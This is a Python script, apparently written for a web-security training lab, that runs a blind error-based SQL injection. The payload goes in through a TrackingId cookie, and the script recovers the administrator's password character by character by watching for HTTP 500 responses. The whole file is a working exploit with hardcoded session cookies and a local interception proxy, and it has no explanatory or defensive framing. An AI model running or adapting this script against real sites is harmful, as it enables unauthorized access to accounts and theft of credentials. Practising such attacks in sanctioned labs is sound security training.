import sys
import requests
import urllib3
import urllib
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "'||(select CASE WHEN ascii(substr(password,%s,1))='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 't5yWOg1cdtR00iTX' + sqli_payload_encoded, 'session': 'xlGtmJ12msXI01fYWNOxoaJLOjuFTdJW'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    with ThreadPoolExecutor() as executor:
        executor.map(sqli_password, [url] * 20)

if __name__ == "__main__":
    main()